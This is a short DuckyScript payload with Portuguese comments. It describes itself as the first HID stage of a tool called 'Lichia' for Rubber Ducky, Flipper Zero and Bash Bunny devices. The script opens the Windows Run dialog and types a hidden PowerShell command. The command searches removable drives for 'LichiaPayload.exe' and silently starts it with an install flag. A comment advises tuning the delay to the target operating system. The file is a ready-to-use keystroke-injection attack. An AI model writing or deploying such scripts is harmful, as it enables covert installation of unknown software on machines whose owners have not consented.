REM Lichia — first stage HID. abre o executar, varre drives removiveis, roda o bootstrap
REM funciona em Rubber Ducky, Flipper Zero, Bash Bunny. adapte o DELAY ao SO alvo.
DELAY 2000
ESCAPE
GUI r
DELAY 500
STRING powershell -w h -NoP -c "Get-Volume | ? DriveType -eq 2 | % { $p = Join-Path (Join-Path $_.DriveLetter ':') 'Lichia\\LichiaPayload.exe'; if (Test-Path $p) { Start-Process $p '--install' -w h } }"
ENTER
